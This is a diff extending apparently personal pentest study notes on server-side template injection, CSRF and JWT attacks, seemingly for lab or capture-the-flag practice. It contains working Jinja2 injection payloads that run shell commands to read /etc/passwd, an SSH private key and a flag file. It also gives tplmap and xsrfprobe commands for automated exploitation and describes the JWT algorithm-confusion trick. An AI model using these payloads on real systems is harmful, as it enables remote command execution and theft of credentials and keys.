@@ -9,3 +9,58 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20
 {{config.__class__.__init__.__globals__['os'].popen(cat /etc/passwd).read()}}
 {{ ''.__class__.__mro__[2].__subclasses__()[40]()().read()}}
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/test/.ssh/id_rsa').read() }}
+
+-------------------------------------------------------------------------------------------------------------------
+
+Automatic Exploitation of SSTI (server side template injection)
+-use tool: Tplmap
+-install using python
+
+get: tplmap -u <url>/?<vulnparam>
+post: tplmap -u <url> -d '<vulnparam>
+
+tplmap -u http://10.10.10.10:5000/ -d 'noot' --os-cmd "cat /etc/passwd"
+
+-------------------------------------------------------------------------------------------------------------------
+
+Server side template injection challenge
+
+{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
+
+----------------------------------------------------------------------------------
+CSRF - Cross site request forgery. 
+-the victim makes the request not the site
+-site sees a normal request from a normal user
+-could lead to user's account being fully compromised through the use of a password reset
+-attacker gains personal information about a user
+
+---------------------------------------------------------------------------------
+
+Manual and Automatic Exploitation
+
+Manual - change user request in Burp
+
+Automatic - automated scanner: xsrfprobe
+pip3 install xsrfprobe
+xsrfprobe -u <url>/<endpoint>
+
+--malicious: generate a malicious CSRF form which can be used in real-world exploits
+
+----------------------------------------------------------------------------------
+
+JWT 
+
+Json Web Token - secure method of authentication
+-"header.payload.secret" - secret is only know to the server 
+-used to make sure that data wasn't changed along the way
+-base64 encoded
+-changing the secret can change the data
+-header looks like {"type": "JWT", "alg": "RS256"}
+-alg field: RS256 -> private RSA key only available to the server
+-chanign the field to HS256 -> server's public key (can be accessed)
+
+-------------------------------------------------------------------------------
+
+JWT manual exploitation
+
+
